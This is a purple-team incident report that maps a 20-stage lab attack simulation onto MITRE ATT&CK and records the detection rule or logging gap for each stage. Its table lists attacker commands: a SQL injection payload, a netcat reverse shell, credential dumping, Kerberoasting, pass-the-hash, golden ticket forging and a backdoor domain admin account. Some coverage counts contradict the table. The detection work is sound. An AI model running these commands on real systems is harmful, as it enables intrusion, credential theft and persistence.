# MITRE ATT&CK Enterprise Framework Mapping

> **Incident Identifier:** `INC-2026-1018-ALPHA`  
> **Report Identifier:** `IR-2026-1018-MITRE`  
> **Framework Version:** MITRE ATT&CK Enterprise v15.1  
> **Lead Incident Responder:** Manichand Gupta  
> **Evaluation Scope:** 20 Attack Simulation Stages across 11 ATT&CK Tactics

[![Attack Simulation 20-Stage Kill Chain Roadmap](../06-Resources/diagrams/Attack%20Simulation%2020-Stage%20Kill%20Chain%20Roadmap.png)](../06-Resources/diagrams/Attack%20Simulation%2020-Stage%20Kill%20Chain%20Roadmap.png)
*Figure 1: Complete 20-stage attack simulation lifecycle mapped across the 3 investigation cases, showing detection statuses and tool vectors.*

---

## 📑 ATT&CK Master Alignment Matrix

The table below maps all 20 adversary stages across their corresponding MITRE ATT&CK tactics, techniques, adversary execution commands, victim hosts, detection statuses, and primary defensive sensor rules:

| Stg | ATT&CK Tactic | Technique Name | Sub-Technique ID | Adversary Execution Vector | Target Asset | Detection Status | Defensive Sensor & Rule ID |
|:---:|:---|:---|:---:|:---|:---|:---:|:---|
| **01** | Reconnaissance | Active Scanning: Port Scanning | `T1595.001` | `nmap -sS -sV -O -p- 192.168.56.30` | DVWA (`192.168.56.30`) | **Direct Detection** | Suricata SIDs `3400001`, `3400002` / Wazuh Rule `100410` |
| **02** | Credential Access | Brute Force: Password Guessing | `T1110.001` | `python3 dvwa_bruteforce.py` (User-Agent: `python-requests`) | DVWA (`192.168.56.30`) | **Direct Detection** | Suricata SID `2017515` + Custom Rule `100600` / Rule `100200` |
| **03** | Initial Access | Exploit Public-Facing Application | `T1190` | `1' UNION SELECT user, password FROM users-- -` | DVWA (`192.168.56.30`) | **Direct Detection** | Suricata SID `2010963` (`ET WEB_SERVER SELECT USER`) / Custom Wazuh Rule `100600` & Rule `100200` |
| **04** | Credential Access | Brute Force: Password Cracking | `T1110.002` | `hashcat -m 0 hashes.txt rockyou.txt` | Local Kali (`192.168.232.135`) | **Investigatively Attributed (Offline Gap DG-04)** | *Inherent Offline Gap (Zero Victim Telemetry; Bracketed 03 -> 05)* |
| **05** | Persistence | Server Software Component: Web Shell | `T1505.003` | Upload `shell.php` via `/vulnerabilities/upload/` | DVWA (`192.168.56.30`) | **Direct Detection** | Wazuh Rule `100199` / Suricata SID `2019284` / Auditd `execve` |
| **06** | Execution | Command & Scripting Interpreter: Unix Shell | `T1059.004` | `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f \| /bin/sh -i 2>&1 \| nc ...` | DVWA (`192.168.56.30`) | **Direct Detection** | Suricata SID `3400020` / Auditd `stty sane` (Rule `web_process_creation`) |
| **07** | Privilege Escalation | Abuse Elevation Control: Sudo Caching | `T1548.003` | `sudo /usr/bin/python3 -c 'import os; os.system("/bin/bash")'` | DVWA (`192.168.56.30`) | **Direct Detection** | Wazuh PAM Rule `5402` (`sudo to ROOT`) / Auditd `execve` |
| **08** | Persistence | Account Manipulation: SSH Authorized Keys | `T1098.004` | `echo "ssh-ed25519..." >> /root/.ssh/authorized_keys` | DVWA (`192.168.56.30`) | **Direct Detection** | Wazuh Rule `5715` / Rule `100220` (`bashcmd`) |
| **09** | Discovery | Remote System Discovery: Network Sweep | `T1018` | `nmap -sV -O 192.168.56.0/24 --open` | Internal Subnet | **Target Logging Gap (DG-09)** | Suricata `ens37` wire SIDs `3400001`, `3400002`, `3400020` / Wazuh Rule `100220` (Target WFP drops unlogged) |
| **10** | Credential Access | Adversary-in-the-Middle: LLMNR/NBT-NS | `T1557.001` | `python3 /opt/Responder/Responder.py -I ens33 -wd` | Win10 (`192.168.56.20`) | **Direct Detection** | Wazuh Rule `100220` (`bashcmd` uid:0 Responder) / Sysmon `rundll32` |
| **11** | Credential Access | Brute Force: Password Cracking | `T1110.002` | `hashcat -m 5600 win10.hash rockyou.txt` | Local Kali (`192.168.232.135`) | **Investigatively Attributed (Offline Gap DG-11)** | *Inherent Offline Gap (Zero Victim Telemetry; Bracketed 10 -> 12)* |
| **12** | Discovery | Permission Groups Discovery: Domain Groups | `T1087.002` | `bloodhound-python -u win10 -p Secur3Lab! -d ad.lab -c All` | `PC-DC` (`192.168.56.10`) | **Target Logging Gap (DG-12)** | Linux Pivot Rule `100220` + Alert #22; DC EID 1644 LDAP diagnostics unconfigured |
| **13** | Credential Access | Steal or Forge Kerberos Tickets: Kerberoasting | `T1558.003` | `python3 GetUserSPNs.py ad.lab/win10:Secur3Lab! -request` | `PC-DC` (`192.168.56.10`) | **Direct Detection** | Suricata SID `2019922` / Wazuh Rule `100220` (`GetUserSPNs.py`) & Rule `5715` |
| **14** | Credential Access | OS Credential Dumping: DCSync | `T1003.006` | `python3 secretsdump.py 'ad.lab/HANK_SHERMAN:Password123@...'` | `PC-DC` (`192.168.56.10`) | **Pivot-Only Coverage (DG-14)** | Linux Pivot Rule `100220` + Alert #24; DC EID 4662 replication SACL unconfigured |
| **15** | Lateral Movement | Use Alternate Auth: Pass the Hash | `T1550.002` | `python3 wmiexec.py -hashes :... Administrator@192.168.56.10` | `PC-DC` (`192.168.56.10`) | **Direct Detection** | Windows EID `4624` / Wazuh Rule `100613` & Rule `100220` (`wmiexec.py`) |
| **16** | Credential Access | Steal or Forge Kerberos Tickets: Golden Ticket | `T1558.001` | `python3 ticketer.py -nthash 611a8... -domain-sid S-1-5-21...` | Linux Pivot Host | **Pivot-Only Coverage (DG-16)** | Linux Pivot Rule `100220` + Alerts #27, #28 on wmiexec -k; DC EID 4769 unconfigured |
| **17** | Persistence | Create Account: Domain Account | `T1136.002` | `cmd.exe /Q /c net user backdoor P@ssw0rd123! /add /domain` | `PC-DC` (`192.168.56.10`) | **Direct Detection** | Wazuh Rule `60109` (Windows EID 4720 user creation) |
| **17** | Persistence | Account Manipulation: Domain Groups | `T1098` | `cmd.exe /Q /c net group "Domain Admins" backdoor /add /domain` | `PC-DC` (`192.168.56.10`) | **Direct Detection** | Wazuh Rule `60159` (Windows EID 4728 group addition) |
| **18** | Collection | Data from Local System: Staging | `T1005` | `cmd.exe /Q /c net user /domain > C:\Windows\Temp\domain_users.txt` | `PC-DC` & `Win10` | **Direct Detection** | Sysmon EID `1` (Process creation) / Wazuh Custom Rule `100613` |
| **19** | Exfiltration | Exfiltration Over C2 Channel: SCP Burst | `T1041` | `scp -i id_ed25519 root@192.168.56.30:/tmp/*.txt .` | DVWA (`192.168.56.30`) | **Direct Detection** | Wazuh SSHD Rule `5715` Rate Anomaly (6 sessions in 570 ms) |
| **20** | Impact | Internal Defacement: Desktop Wallpaper | `T1491.001` | `reg add "HKCU\Control Panel\Desktop" /v Wallpaper /d "hacked.bmp"` | `PC-DC` & `Win10` | **Direct Detection** | Sysmon EID `1` (reg.exe process creation) / Wazuh Rule `92041` |
| **20** | Impact | Data Encrypted for Impact: Simulated Extortion | `T1486` | Dropped `README_HACKED.txt` & dummy encrypted `.enc` files | `PC-DC` & `Win10` | **Direct Detection** | Sysmon EID `1` (echo redirection) / Wazuh Custom Rule `100613` |
| **20** | Impact | System Shutdown / Reboot: Forced Restart | `T1529` | `cmd.exe /Q /c shutdown /r /t 0` | `PC-DC` & `Win10` | **Direct Detection** | Sysmon EID `1` / Windows System Event Log EID `1074` |

---

## 📊 Tactical Coverage & Performance Metrics

```text
Total MITRE ATT&CK Tactics Exercised:       11
Total Unique ATT&CK Techniques Tested:      20 (including sub-techniques)
Direct Target & Wire Detections:            14 Stages (70.0%)
Operational Pivot-Only Alerts:               2 Stages (10.0% — DG-14, DG-16)
Documented Target Logging Gaps:              2 Stages (10.0% — DG-09, DG-12)
Documented Inherent Offline Gaps:            2 Stages (10.0% — DG-04, DG-11)
Operational SOAR Alert Delivery:            16 Stages (80.0% — 46 TheHive alerts)
Detection Engine Rule Execution Drops:       0 Stages (0.0%)
```

### Breakdown by ATT&CK Tactic
1. **Reconnaissance (`TA0043`):** 1 Technique (`T1595.001` Active Scanning) -> **100% Detected** via Suricata NIDS.
2. **Initial Access (`TA0001`):** 1 Technique (`T1190` Exploit Public-Facing Application) -> **100% Detected** via Suricata SQL injection signatures.
3. **Execution (`TA0002`):** 1 Technique (`T1059.004` Unix Shell) -> **100% Detected** via Auditd `execve` tracking and Suricata C2 socket alerts.
4. **Persistence (`TA0003`):** 3 Techniques (`T1505.003` Web Shell, `T1098.004` SSH Keys, `T1136.002` Domain Account) -> **100% Detected** via Wazuh Rule `100220` (bashcmd), Linux SSH Rule 5715, Windows Event ID 4720, and Sysmon EID 1 process fan-out.
5. **Privilege Escalation (`TA0004`):** 1 Technique (`T1548.003` Sudo Caching) -> **100% Detected** via Wazuh PAM Rule 5402 (`sudo to ROOT`).
6. **Credential Access (`TA0006`):** 6 Techniques (`T1110.001` Brute Force, `T1110.002` Hash Cracking, `T1557.001` Poisoning, `T1558.003` Kerberoasting, `T1003.006` DCSync, `T1558.001` Golden Ticket) -> **3 Direct Detections (02, 10, 13) / 2 Pivot-Only Alerts (14, 16) / 2 Inherent Offline Gaps (04, 11)**.
7. **Discovery (`TA0007`):** 2 Techniques (`T1018` Remote System Discovery, `T1087.002` Domain Groups) -> **2 Target Logging Gaps (DG-09, DG-12)** (Stage 09 wire frames & pivot captured; Stage 12 pivot & generic logon captured; diagnostic host logs unconfigured).
8. **Lateral Movement (`TA0008`):** 1 Technique (`T1550.002` Pass the Hash) -> **100% Detected** via Windows Security Event ID 4624 (Logon Type 3 NTLM) and Wazuh WMI fan-out correlation Rule 100613.
9. **Collection (`TA0009`):** 1 Technique (`T1005` Data from Local System) -> **100% Detected** via Sysmon EID 1 process tracking and Wazuh Custom Rule 100613 / Rules 100271, 100272, 100275.
10. **Exfiltration (`TA0010`):** 1 Technique (`T1041` Exfiltration Over C2 Channel) -> **100% Detected** via Wazuh SSHD administrative authentication rate anomaly correlation.
11. **Impact (`TA0040`):** 3 Techniques (`T1491.001` Internal Defacement, `T1486` Data Encrypted for Impact, `T1529` System Shutdown/Reboot) -> **100% Detected** via Sysmon EID 1 (`reg.exe` add, Rule 92041) and Windows System Event Log EID 1074.
